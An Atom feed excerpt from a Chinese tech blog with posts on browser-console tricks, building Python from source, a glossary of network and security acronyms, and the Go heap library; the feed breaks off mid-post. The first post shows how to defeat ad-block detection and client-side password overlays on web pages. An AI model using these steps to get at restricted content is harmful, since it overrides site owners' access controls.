    <id>https://xchens.cn/posts/75c80efa/</id>
    <published>2021-07-01T10:46:47.000Z</published>
    <updated>2021-11-18T09:10:51.142Z</updated>
    
    <content type="html"><![CDATA[<h2 id="知识自由"><a href="#知识自由" class="headerlink" title="知识自由"></a>知识自由</h2><p>互联网精神的核心应该是知识共享。</p><p>这里介绍一些走向知识自由的技巧。</p><h2 id="Trick"><a href="#Trick" class="headerlink" title="Trick"></a>Trick</h2><h3 id="1-开启网页可编辑"><a href="#1-开启网页可编辑" class="headerlink" title="1. 开启网页可编辑"></a>1. 开启网页可编辑</h3><blockquote><p>让网页上的任意内容变得易于修改和复制</p></blockquote><p>打开控制台 -&gt; 在 console 里执行：  </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 以下两个命令效果几乎一样，选择任一个即可</span></span><br><span class="line"><span class="built_in">document</span>.body.contentEditable=<span class="literal">true</span>;</span><br><span class="line"><span class="built_in">document</span>.designMode=<span class="string">&#x27;on&#x27;</span>;</span><br></pre></td></tr></table></figure><h3 id="2-开启右键点击"><a href="#2-开启右键点击" class="headerlink" title="2. 开启右键点击"></a>2. 开启右键点击</h3><blockquote><p>禁用「禁用右键」</p></blockquote><p>打开控制台 -&gt; 在 console 里执行：  </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.oncontextmenu=<span class="literal">null</span></span><br><span class="line"><span class="built_in">document</span>.body.oncontextmenu=<span class="literal">null</span></span><br></pre></td></tr></table></figure><p>若不生效，可能是在其他 div 上禁用了右键。可以通过禁用 JavaScript 解决。</p><h3 id="3-禁用浏览器-JavaScript-运行"><a href="#3-禁用浏览器-JavaScript-运行" class="headerlink" title="3. 禁用浏览器 JavaScript 运行"></a>3. 禁用浏览器 JavaScript 运行</h3><blockquote><p>究极大法：可以绕过所有 code trick</p></blockquote><p>打开控制台（审查元素）-&gt; 打开设置 -&gt; Preferences -&gt; Debugger -&gt; 勾选「Disable JavaScirpt」</p><p>注意在网页加载完成后禁用，避免网页渲染不完整。</p><h3 id="4-禁止加载-JavaScript-资源"><a href="#4-禁止加载-JavaScript-资源" class="headerlink" title="4. 禁止加载 JavaScript 资源"></a>4. 禁止加载 JavaScript 资源</h3><blockquote><p>有的 JavaScript 生来就是捣乱的</p></blockquote><p>打开控制台（审查元素）-&gt; NetWork -&gt; 找到需要屏蔽的 js 资源 -&gt; 右键后点击 「block request URL」-&gt; 最后刷新网页</p><h2 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h2><blockquote><p>每个人都有保护自己版权的权利，请尊重他人的前提下使用</p></blockquote><h3 id="1-绕过「广告屏蔽识别」"><a href="#1-绕过「广告屏蔽识别」" class="headerlink" title="1. 绕过「广告屏蔽识别」"></a>1. 绕过「广告屏蔽识别」</h3><p>有的网站会检测自己的广告是否加载，当广告加载失败后会用js删除网页内容</p><p>这类一般都是通过引入单独的js资源实现，并不会嵌入到每个网页中，所以只要找到这个 js 并拦截即可</p><p>或者手快一点，在页面加载完成后立即禁用 js</p><h3 id="2-阅读带密码网页"><a href="#2-阅读带密码网页" class="headerlink" title="2. 阅读带密码网页"></a>2. 阅读带密码网页</h3><p>这类网页的情况比较复杂，需要分别讨论</p><p>a. 在网页顶层套了一个输入密码的 div ，阻止观看  </p><p>打开<code>浏览器控制台</code>，选中对应 div，删除即可</p><p>b. 通过js加载密码模块</p><p>查看js，选中并右键拦截，刷新网页后即可</p><p>c. 套了div，并有 js 循环生成，或者其他更复杂的情况</p><p>阻止相关 js 加载，然后等页面渲染完成后禁用 js 运行，最后再删除 div</p><hr><p>原创不易，转载请注明来源 xchens.cn</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;知识自由&quot;&gt;&lt;a href=&quot;#知识自由&quot; class=&quot;headerlink&quot; title=&quot;知识自由&quot;&gt;&lt;/a&gt;知识自由&lt;/h2&gt;&lt;p&gt;互联网精神的核心应该是知识共享。&lt;/p&gt;
&lt;p&gt;这里介绍一些走向知识自由的技巧。&lt;/p&gt;
&lt;h2 id=&quot;Trick&quot;&gt;&lt;a</summary>
      
    
    
    
    
    <category term="tricks`" scheme="https://xchens.cn/tags/tricks/"/>
    
  </entry>
  
  <entry>
    <title>linux如何从源码安装纯净版python3</title>
    <link href="https://xchens.cn/posts/fd58792a/"/>
    <id>https://xchens.cn/posts/fd58792a/</id>
    <published>2021-05-10T10:51:57.000Z</published>
    <updated>2021-11-18T09:10:51.142Z</updated>
    
    <content type="html"><![CDATA[<h1 id="编译安装纯净python3，不干扰已存在的任何版本python"><a href="#编译安装纯净python3，不干扰已存在的任何版本python" class="headerlink" title="编译安装纯净python3，不干扰已存在的任何版本python"></a>编译安装纯净python3，不干扰已存在的任何版本python</h1><h2 id="安装依赖库"><a href="#安装依赖库" class="headerlink" title="安装依赖库"></a>安装依赖库</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 基于apt的系统 (如 Debian, Ubuntu, Mint)</span><br><span class="line">sudo apt-get install -y make build-essential libssl-dev zlib1g-dev \</span><br><span class="line">       libbz2-dev libreadline-dev libsqlite3-dev wget curl llvm \</span><br><span class="line">       libncurses5-dev libncursesw5-dev xz-utils tk-dev</span><br><span class="line"></span><br><span class="line"># 基于yum的系统 (如 CentOS)</span><br><span class="line">sudo yum -y install gcc openssl-devel bzip2-devel libffi-devel</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="准备python源码"><a href="#准备python源码" class="headerlink" title="准备python源码"></a>准备python源码</h2><p>在 <code>https://www.python.org/downloads/</code> 找到合适的版本并下载源码</p><h2 id="编译安装"><a href="#编译安装" class="headerlink" title="编译安装"></a>编译安装</h2><blockquote><p>以 <code>python 3.9.5</code> 为例。</p></blockquote><p>执行源码包下载及编译安装流程，请确保网络状况良好</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 目标安装位置，修改此变量以安装到其他位置</span></span><br><span class="line">PYTHON395=/usr/local/python395</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 下载 python 3.9.5</span></span><br><span class="line">wget https://www.python.org/ftp/python/3.9.5/Python-3.9.5.tgz</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 解压源码包到当前路径下</span></span><br><span class="line">tar xvf Python-3.9.5.tgz</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 进入源码目录</span></span><br><span class="line">cd Python-3.9.5</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 配置编译选项</span></span><br><span class="line">./configure --enable-optimizations --with-ensurepip=install --prefix=$&#123;PYTHON395&#125;</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 多线程编译</span></span><br><span class="line">make -j 8</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 完整安装：修改系统python3指向自己</span></span><br><span class="line"><span class="meta">#</span><span class="bash">sudo make install</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 绿色安装: 不改变系统环境，仅将编译后的结果安装到目标位置下</span></span><br><span class="line">sudo make altinstall </span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="FAQ"><a href="#FAQ" class="headerlink" title="FAQ"></a>FAQ</h2><h3 id="1-下载安装包失败"><a href="#1-下载安装包失败" class="headerlink" title="1. 下载安装包失败?"></a>1. 下载安装包失败?</h3><p>删除已下载的文件，并在检查网络后重试。</p><h3 id="2-编译过程失败？"><a href="#2-编译过程失败？" class="headerlink" title="2. 编译过程失败？"></a>2. 编译过程失败？</h3><p>尝试去掉 <code>--enable-optimizations</code> 选项并重新配置编译安装</p><h3 id="3-安装过程没有权限？"><a href="#3-安装过程没有权限？" class="headerlink" title="3. 安装过程没有权限？"></a>3. 安装过程没有权限？</h3><p>安装过程是绿色可靠的，之所以上述代码在安装时仍然使用了sudo，<br>但这只是将程序安装到 <code>/usr/local/</code> 目录下所必需的。<br>把安装目标位置修改为其他存在权限的目录下，可以去掉 <code>sudo</code> 操作。</p><h3 id="4-CentOS-编译时仍然提示缺少依赖？"><a href="#4-CentOS-编译时仍然提示缺少依赖？" class="headerlink" title="4. CentOS 编译时仍然提示缺少依赖？"></a>4. CentOS 编译时仍然提示缺少依赖？</h3><p>尝试： <code>sudo yum -y groupinstall &quot;Development Tools&quot;</code> ，<br>然后使用 <code>make clean</code> 清理掉编译缓存，接着继续重试配置、编译、安装等操作。</p><h3 id="5-WARNING-The-script-pip3-9-is-installed-in-‘-usr-local-python395-bin’-which-is-not-on-PATH"><a href="#5-WARNING-The-script-pip3-9-is-installed-in-‘-usr-local-python395-bin’-which-is-not-on-PATH" class="headerlink" title="5. WARNING: The script pip3.9 is installed in ‘/usr/local/python395/bin’ which is not on PATH."></a>5. WARNING: The script pip3.9 is installed in ‘/usr/local/python395/bin’ which is not on PATH.</h3><p>可以忽略。这个只是警告python程序的目录无法被直接找到，可以选择将此路径添加的 PATH 环境变量即可。</p><h3 id="6-WARNING-Running-pip-as-root-will-break-packages-and-permissions-You-should-install-packages-reliably-by-using-venv-https-pip-pypa-io-warnings-venv"><a href="#6-WARNING-Running-pip-as-root-will-break-packages-and-permissions-You-should-install-packages-reliably-by-using-venv-https-pip-pypa-io-warnings-venv" class="headerlink" title="6. WARNING: Running pip as root will break packages and permissions. You should install packages reliably by using venv: https://pip.pypa.io/warnings/venv"></a>6. WARNING: Running pip as root will break packages and permissions. You should install packages reliably by using venv: <a href="https://pip.pypa.io/warnings/venv">https://pip.pypa.io/warnings/venv</a></h3><p>由于在安装步骤我们使用了sudo，导致对应的文件属主都是root，将其修改回来即可。<br>如 <code>sudo chown -R user:group /usr/local/python395</code>。<br>当然也可以选择在配置编译前，指定一个普通用户的安装目录，同时去除掉安装时的 <code>sudo</code> 亦可。   </p><h3 id="7-不需要纯净安装，如何将-python-加入环境变量？"><a href="#7-不需要纯净安装，如何将-python-加入环境变量？" class="headerlink" title="7. 不需要纯净安装，如何将 python 加入环境变量？"></a>7. 不需要纯净安装，如何将 python 加入环境变量？</h3><p>方案一： 在安装时将 <code>sudo make altinstall</code> 替换为 <code>sudo make install</code><br>方案二： 在 <code>~/.bashrc</code> <code>/etc/bashrc</code> 等文件中任一个加入以下语句即可。注意要修改python路径为自己的实际安装路径。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export PATH=$PATH:/usr/local/python395/bin</span><br></pre></td></tr></table></figure><ul><li>注意此时的<code>/usr/local/python395/bin</code>路径下仅有 python3.9 和 pip3.9 等文件，直接终端输入 python3 是无法找到这里的。</li><li>需要将 python3 的符号链接指向这里的 python3.9 才能完成配置。 即 <code>ln -s /usr/local/python395/bin/python3.9 /usr/bin/python3 </code></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;编译安装纯净python3，不干扰已存在的任何版本python&quot;&gt;&lt;a href=&quot;#编译安装纯净python3，不干扰已存在的任何版本python&quot; class=&quot;headerlink&quot; title=&quot;编译安装纯净python3，不干扰已存在的任何版本pytho</summary>
      
    
    
    
    
    <category term="linux" scheme="https://xchens.cn/tags/linux/"/>
    
    <category term="python3" scheme="https://xchens.cn/tags/python3/"/>
    
  </entry>
  
  <entry>
    <title>那些年我们看不懂的缩写 - network,security,and so on.</title>
    <link href="https://xchens.cn/posts/f0dba9bd/"/>
    <id>https://xchens.cn/posts/f0dba9bd/</id>
    <published>2021-05-10T10:00:00.000Z</published>
    <updated>2021-11-18T09:10:51.142Z</updated>
    
    <content type="html"><![CDATA[<h2 id="网络"><a href="#网络" class="headerlink" title="网络"></a>网络</h2><ul><li><p><code>AP</code> (Access Point)<br>  无线接入点</p></li><li><p><code>STA</code> (Station)<br>  站点，任何一个接入无线AP的设备都可以称为一个站点</p></li><li><p><code>SSID</code> (Service Set Identifier)<br>  每个无线AP都应该有一个标示用于用户识别，SSID就是这个用于用户识别的的名字，也就是我们经常说到的wifi名</p></li><li><p><code>LB</code> (Load Balance) 负载均衡<br>  用于将流量均衡合理地分配到不同机器。 </p></li><li><p><code>CSR</code> (Cerificate Signing Request) 证书请求文件<br>  我们想要证明我们的网站是可信的，数据传输是加密的，我们就需要由第三方CA机构颁发的证书来证明，比如Symantec，GeoTrust等等。<br>  而想要申请这样的证书，我们的第一步就是需要生成我们自己的CSR文件。<br>  CSR需要由申请人提供域名、公司名称、部门、省份、城市、国家借助相关工具生成，工具同时会生成证书请求文件和私钥文件，其中的证书请求文件就是CSR文件，这两个文件是相互匹配的，我们将CSR文件提交给CA申请证书，经过CA身份对申请者身份进行审核后，颁发证书公钥，申请人收到证书文件后，将证书公钥文件配合私钥文件转化成服务器对应的格式的文件部署在HTTP服务器上面，这样我们的网站就可信了。  </p></li><li><p><code>TFO</code> (TCP Fast Open)<br>  它通过握手开始时的SYN包中的TFO cookie（一个TCP选项）来验证一个之前连接过的客户端。如果验证成功，它可以在三次握手最终的ACK包收到之前就开始发送数据，这样便跳过了一个绕路的行为，更在传输开始时就降低了延迟。这个加密的Cookie被存储在客户端，在一开始的连接时被设定好。然后每当客户端连接时，这个Cookie被重复返回。<br>  TCP握手开始时，客户端发送的SYN包带有数据和cookie，服务端会校验此cookie，若cookie合法则视作建立连接成功并将数据返回给上层应用，否则丢弃数据并返回SYN+ACK从而进入TCP第二次握手。客户端根据服务端响应来决定继续TCP握手并重发数据或进入下一步。<br>  <a href="https://zh.wikipedia.org/wiki/TCP%E5%BF%AB%E9%80%9F%E6%89%93%E5%BC%80">更多详情</a> </p></li><li><p>SLD (second-level domain) 二级域名<br>  <a href="http://www.example.com中,example.com就是二级域名/">www.example.com中，example.com就是二级域名</a>      </p></li></ul><h2 id="安全"><a href="#安全" class="headerlink" title="安全"></a>安全</h2><ul><li><p><code>ROP</code>（Return-Oriented Programming） 面向返回编程<br>  一种计算机安全漏洞利用技术，该技术允许攻击者在安全防御的情况下执行代码，如不可执行的内存和代码签名。攻击者控制堆栈调用以劫持程序控制流并执行针对性的机器语言指令序列（称为Gadgets）。 每一段gadget通常结束于return指令，并位于共享库代码中的子程序。系列调用这些代码，攻击者可以在拥有更简单攻击防范的程序内执行任意操作。<br>  ROP是一种高级的堆栈溢出攻击。这类攻击往往利用操作堆栈调用时的程序漏洞，通常是缓冲区溢出。在缓冲区溢出中，在将数据存入内存前未能正确检查适当范围的函数会收到多于正常承受范围的数据，如果数据将写入栈，多余的数据会溢出为函数变量分配的空间并覆盖替换返回地址（return address）。在原本用以重定向控制流并返回给调用者的地址被覆盖替换后，控制流将改写到新分配的地址。<br>  <a href="https://bbs.pediy.com/thread-223798.htm">更多详情</a></p></li><li><p><code>RCE</code> (Remote Code Execution)<br>  远程代码执行</p></li><li><p><code>EDR</code> (Endpoint Detection and Response) 端点检测与响应<br>  指端上安全检测。有时特指办公网内对员工机器的风险监控。<br>  <a href="https://www.esecurityplanet.com/products/top-endpoint-detection-response-solutions.html">更多详情</a></p></li><li><p><code>CVSS</code> (Common Vulnerability Scoring System) 通用漏洞评分系统<br> CVSS分值遵循被广泛采纳的行业标准，根据漏洞的多种属性通过公式计算得出。主要用于量化漏洞的严重程度。<br> 在CVSS v3.0评分体系中，不同分值代表的漏洞严重程度如下：   </p><ul><li>0.0：无漏洞   </li><li>0.1~3.9：低危   <ul><li>可导致本地拒绝服务的漏洞。  </li><li>其他危害较低的漏洞。  </li></ul></li><li>4.0~6.9：中危  <ul><li>需要进行交互才能影响用户的漏洞。  </li><li>可导致普通越权操作的漏洞。  </li><li>通过本地修改配置或获取信息之后，可进一步利用的漏洞。  </li></ul></li><li>7.0~8.9：高危  <ul><li>可间接获取服务器和应用系统的普通权限的漏洞。  </li><li>可导致任意文件读取、下载、写入、或删除的漏洞。  </li><li>可导致敏感信息泄漏的漏洞。  </li><li>可直接导致业务中断、或远程拒绝服务的漏洞。  </li></ul></li><li>9.0~10.0：严重  <ul><li>可直接获取服务器系统权限的漏洞。  </li><li>可直接获取重要的敏感信息，导致数据泄漏的漏洞。  </li><li>可直接导致敏感信息越权访问的漏洞。  </li><li>可造成大范围影响的其他漏洞。  </li></ul></li></ul></li><li><p><code>NTA</code> (Network Traffic Analysis) 网络流量分析<br>  一般指对网络流量进行分析的安全产品。</p></li><li><p><code>SIEM</code> (Security Infomation and Events Manager) 安全信息和事件管理<br>  简单地说，SIEM是一个由多个监视和分析组件组成的安全系统，旨在帮助组织检测和减轻威胁。<br>  如上所述，SIEM将许多其他安全规程和工具结合在一个综合的框架下:  </p><ul><li><p>日志管理(LMS)——用于传统日志收集和存储的工具。  </p></li><li><p>安全信息管理(SIM)——集中于从多个数据源收集和管理与安全相关的数据的工具或系统。例如，这些数据源可以是防火墙、DNS服务器、路由器和防病毒应用程序。  </p></li><li><p>安全事件管理(SEM)——基于主动监视和分析的系统，包括数据可视化、事件相关性和警报。   </p><p>SIEM是今天的术语管理系统,所有上述合并到一个层,知道如何从分布式自动收集和处理信息的来源,将它存储在一个集中位置,不同事件之间的关联,并根据这些信息生成警报和报告。  </p></li></ul></li><li><p><code>SOC</code> (Security Operation Center) 安全运营中心<br>  一般一个较完善的SOC应该具有以下模块：   </p><ul><li>安全设备集中管理<ul><li>统一日志管理（集中监控）</li><li>统一配置管理（集中管理）</li><li>各安全产品和系统的统一协调和处理（协同处理）</li><li>设备自动发现</li></ul></li><li>安全服务集中管理<ul><li>安全培训管理</li><li>风险分析自动化</li></ul></li><li>业务流程的安全管理<ul><li>初步的资产管理（资产、人员）</li><li>安全管理系统与网关系统的联动（协调处理）</li><li>与其他信息系统的高度融合</li></ul></li><li>组织的安全管理<ul><li>组织构成</li><li>组织责任</li></ul></li></ul></li><li><p><code>IOC</code> (Indicators of Compromise) 威胁指示<br>  IOC在取证时常常被描述为用于指示网络安全性已被破坏的计算机证据。<br>  在网络中,IOC可能是一个MD5哈希值,一个C2结构域或硬编码的IP地址,一个注册表项,文件名等。这些IOC都在不断变化来保护网络的安全。<br>  同样,根据2012年MITRE的定义,这显然是观测量,而不是IOC本身。Ross和Breem甚至指出这种与IOC之间的联系(见下文),以及IOC是如何“不断变化的”。他提道: “在网络领域中,IOA的力量会展示一个攻击者是如何侵入你的计算机,访问的文件,破解密码,并最终盗取数据的。”<br>  <a href="https://www.anquanke.com/post/id/83830">更多详情</a>  </p></li><li><p><code>RASP</code>（Runtime Application Self-Protection）运行时应用自我保护<br>  RSAP将自身注入到应用程序中，与应用程序融为一体，实时监测、阻断攻击，使程序自身拥有自保护的能力。并且应用程序无需在编码时进行任何的修改，只需进行简单的配置即可。<br>  <a href="http://blog.nsfocus.net/rasp-tech/">更多详情</a>  </p></li><li><p><code>TIP</code> (Threat Intelligence Platform) 威胁情报平台<br>  是一个可以支持整个安全团队的平台，支持执行日常事件响应、网络防御和威胁分析。成熟的 TIP 用于日常运营，支持对攻击的阻止和处理，支持战略决策和流程改进，它可以帮助实现企业威胁情报计划对威胁情报进行全生命周期的管理。威胁情报的生命周期包括：威胁情报需求分析、收集、分析、使用。  </p></li></ul><h2 id="工作中的快捷表达"><a href="#工作中的快捷表达" class="headerlink" title="工作中的快捷表达"></a>工作中的快捷表达</h2><ul><li><p><code>WIP</code> (Work In Progress) 半成品<br>  表示任务在进行中，未完成   </p></li><li><p><code>FYI</code> (For Your Information) 信息同步<br>  表示将信息同步给你，注意看一下  </p></li></ul><h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><ul><li><p><code>kerberos</code> 基于C/S架构的网络认证授权协议<br>  协议介绍：<a href="https://zh.wikipedia.org/wiki/Kerberos">维基百科</a><br>  相关缩写：  </p><ul><li>AS（Authentication Server）= 认证服务器  </li><li>KDC（Key Distribution Center）= 密钥分发中心  </li><li>TGT（Ticket Granting Ticket）= 票据授权票据，票据的票据  </li><li>TGS（Ticket Granting Server）= 票据授权服务器  </li><li>SS（Service Server）= 特定服务提供端  </li></ul></li><li><p><code>OLAP</code> (Online Analytical Processing) 联机分析处理<br>  OLAP是数据仓库系统的主要应用，支持复杂的分析操作，侧重决策支持，并且提供直观易懂的查询结果。如 hive，clickhouse 等<br>  也叫DSS决策支持系统，就是我们说的数据仓库。在这样的系统中，语句的执行量不是考核标准，因为一条语句的执行时间可能会非常长，读取的数据也非常多。所以，在这样的系统中，考核的标准往往是磁盘子系统的吞吐量（带宽），如能达到多少MB/s的流量。  </p></li><li><p><code>OLTP</code> (Online Transaction Processing) 联机事务处理<br>  OLTP是传统的关系型数据库的主要应用，主要是基本的、日常的事务处理，例如银行交易。典型的OLTP系统有电子商务系统、银行、证券等，如美国eBay的业务数据库，就是很典型的OLTP数据库。<br>  表示事务性非常高的系统，一般都是高可用的在线系统，以小的事务以及小的查询为主，评估其系统的时候，一般看其每秒执行的Transaction以及Execute SQL的数量。在这样的系统中，单个数据库每秒处理的Transaction往往超过几百个，或者是几千个，Select 语句的执行量每秒几千甚至几万个。  </p></li><li><p><code>ETL</code> (Extract Transform Load) 数据处理<br>  用于描述将数据从来源端经过抽取（extract）、转换（transform）、加载（load）到目的端的过程。<br>  即从数据源抽取数据出来，进行清洗加工转换，然后加载到定义好的数据仓库模型中去。<br>  目的是将企业中分散、零乱、标准不统一的数据整合到一起，为企业的决策提供分析依据。</p></li><li><p><code>SLI</code> (Service Level Indicator)</p><ul><li>A carefully defined quantitative measure of some aspect of the level of service that is provided.</li></ul></li><li><p><code>SLO</code> (Service Level Objective)</p><ul><li>A target value or range of values for a service level that is measured by an SLI, e.g.  e.g. SLI &gt;= 99.95%</li></ul></li><li><p><code>SLA</code> (Service Level Agreement)</p><ul><li>An explicit or implicit contract with your users that includes consequences of meeting (or missing) the SLOs they contain.</li></ul></li><li><p><code>idP</code> (Identity Provider) 第三方身份提供商  </p><ul><li>用于第三方登录的身份服务提供商</li></ul></li><li><p><code>IAM</code> (Identity and Access Management) 身份访问管理</p><ul><li>基于用户身份的资源访问权限管理</li></ul></li></ul>]]></content>
    
    
    <summary type="html">计算机网络、安全、编程等相关领域可能涉及到的名词缩写介绍</summary>
    
    
    
    
    <category term="网络" scheme="https://xchens.cn/tags/%E7%BD%91%E7%BB%9C/"/>
    
    <category term="安全" scheme="https://xchens.cn/tags/%E5%AE%89%E5%85%A8/"/>
    
    <category term="杂谈" scheme="https://xchens.cn/tags/%E6%9D%82%E8%B0%88/"/>
    
  </entry>
  
  <entry>
    <title>对golang里&quot;堆&quot;结构的一次实践</title>
    <link href="https://xchens.cn/posts/eeff0c5/"/>
    <id>https://xchens.cn/posts/eeff0c5/</id>
    <published>2021-01-13T06:48:49.000Z</published>
    <updated>2021-11-18T09:10:51.142Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>对golang标准库堆的深入分析与实践 ^.^<br>阅读须知：本文假设读者了解堆的数据结构，并明白堆排序的原理。  </p></blockquote><h2 id="堆排序（heapsort）"><a href="#堆排序（heapsort）" class="headerlink" title="堆排序（heapsort）"></a>堆排序（heapsort）</h2><p>堆一般分为最小堆和最大堆。堆排序是指利用堆这种数据结构所设计的一种排序算法。堆是一个近似完全二叉树的结构，并同时满足堆的性质：即子节点的键值或索引总是小于（或者大于）它的父节点。  </p><h2 id="heap-in-golang"><a href="#heap-in-golang" class="headerlink" title="heap in golang"></a>heap in golang</h2><p>在golang的 <code>container/heap</code> 标准库中提供了堆的实现，但是关于它的介绍却比较少。<br>不少介绍只是简单的搬运的官方的例子。因此这里仔细的介绍了一下具体代码实现的细节。</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// https://golang.org/pkg/container/heap/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 这个代码示例展示了如何使用内建heap接口实现一个整数堆</span></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;container/heap&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 一个int类型构成的最小堆</span></span><br><span class="line"><span class="keyword">type</span> IntHeap []<span class="keyword">int</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(h IntHeap)</span> <span class="title">Len</span><span class="params">()</span> <span class="title">int</span></span>           &#123; <span class="keyword">return</span> <span class="built_in">len</span>(h) &#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(h IntHeap)</span> <span class="title">Less</span><span class="params">(i, j <span class="keyword">int</span>)</span> <span class="title">bool</span></span> &#123; <span class="keyword">return</span> h[i] &lt; h[j] &#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(h IntHeap)</span> <span class="title">Swap</span><span class="params">(i, j <span class="keyword">int</span>)</span></span>      &#123; h[i], h[j] = h[j], h[i] &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(h *IntHeap)</span> <span class="title">Push</span><span class="params">(x <span class="keyword">interface</span>&#123;&#125;)</span></span> &#123;</span><br><span class="line">    <span class="comment">// Push 和 Pop 使用指针接收器，因为它们修改了切片的长度而不仅仅是切片指向的内容</span></span><br><span class="line">    <span class="comment">// golang 使用值拷贝的方式传输参数，append返回的可能是一个全新的切片，如果不用指针会导致本次赋值失效。</span></span><br><span class="line">*h = <span class="built_in">append</span>(*h, x.(<span class="keyword">int</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(h *IntHeap)</span> <span class="title">Pop</span><span class="params">()</span> <span class="title">interface</span></span>&#123;&#125; &#123;</span><br><span class="line">old := *h</span><br><span class="line">n := <span class="built_in">len</span>(old)</span><br><span class="line">x := old[n<span class="number">-1</span>]</span><br><span class="line">*h = old[<span class="number">0</span> : n<span class="number">-1</span>]</span><br><span class="line"><span class="keyword">return</span> x</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这个例子插入了多个 int 到 IntHeap 中，</span></span><br><span class="line"><span class="comment">// 检查最小值然后按权值进行移除。（弹出堆顶）</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">h := &amp;IntHeap&#123;<span class="number">2</span>, <span class="number">1</span>, <span class="number">5</span>&#125;</span><br><span class="line">heap.Init(h)</span><br><span class="line">heap.Push(h, <span class="number">3</span>)</span><br><span class="line">fmt.Printf(<span class="string">&quot;minimum: %d\n&quot;</span>, (*h)[<span class="number">0</span>])</span><br><span class="line"><span class="keyword">for</span> h.Len() &gt; <span class="number">0</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;%d &quot;</span>, heap.Pop(h))</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>参考上述官方代码示例，可以知道要使用这个heap接口，必须自己实现这些方法:   </p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Len() <span class="keyword">int</span></span><br><span class="line">Less(i, j <span class="keyword">int</span>) <span class="keyword">bool</span></span><br><span class="line">Swap(i, j)</span><br><span class="line">Push(x <span class="keyword">interface</span>&#123;&#125;)</span><br><span class="line">Pop() <span class="keyword">interface</span>&#123;&#125;</span><br></pre></td></tr></table></figure><p><code>Len</code> 和 <code>Swap</code> 方法比较直观，分别是返回元素个数和交换元素位置。</p><p><code>Less</code> 方法比较重要，它比较了第 <code>i</code> 和 